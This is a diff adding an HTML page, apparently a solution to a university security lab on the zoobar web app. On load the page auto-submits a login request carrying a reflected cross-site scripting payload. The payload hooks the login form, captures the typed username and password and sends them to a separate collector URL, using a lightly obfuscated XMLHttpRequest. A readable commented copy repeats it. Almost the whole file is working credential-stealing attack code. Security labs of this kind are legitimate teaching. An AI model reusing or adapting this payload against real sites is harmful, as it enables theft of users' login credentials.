@@ -1,0 +1,49 @@
+<html>
+	<body>
+		<script type="text/javascript">
+			function post(path, params, method) {
+				method = method || "post"; // Set method to post by default if not specified.
+		
+				// The rest of this code assumes you are not using a library.
+				// It can be made less wordy if you use one.
+				var form = document.createElement("form");										
+				form.setAttribute("method", method);
+				form.setAttribute("action", path);
+		
+				for(var key in params) {
+					if(params.hasOwnProperty(key)) {
+						var hiddenField = document.createElement("input");
+						hiddenField.setAttribute("type", "hidden");
+						hiddenField.setAttribute("name", key);
+						hiddenField.setAttribute("value", params[key]);
+		
+						form.appendChild(hiddenField);
+					}
+				}				
+				document.body.appendChild(form);
+				form.submit();			
+			}
+				
+		
+				
+			post('http://zoobar.csl.toronto.edu/index.php', {loginusername: "'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];theUrl='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();xhttp=eval(decodeURIComponent('new%20XMLHttpRequest%28%29'));xhttp.open('GET',theUrl,false);xhttp.send();};", loginpassword:"" , submitlogin:"Log+in"});
+				
+			/*
+			
+				'' onFocus=
+				document.getElementsByClassName('warning')[0].innerHTML='';
+				document.getElementsByName('login_form')[0].onsubmit=function(){
+					loginusername=document.getElementsByName('loginusername')[0];
+					loginpassword=document.getElementsByName('loginpassword')[0];
+					theUrl='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();
+					xhttp=eval(decodeURIComponent('new%20XMLHttpRequest%28%29'));
+					xhttp.open('GET',theUrl,false);
+					xhttp.send();	
+				};			
+				
+				
+			*/
+			
+		</script>
+	</body>
+</html>
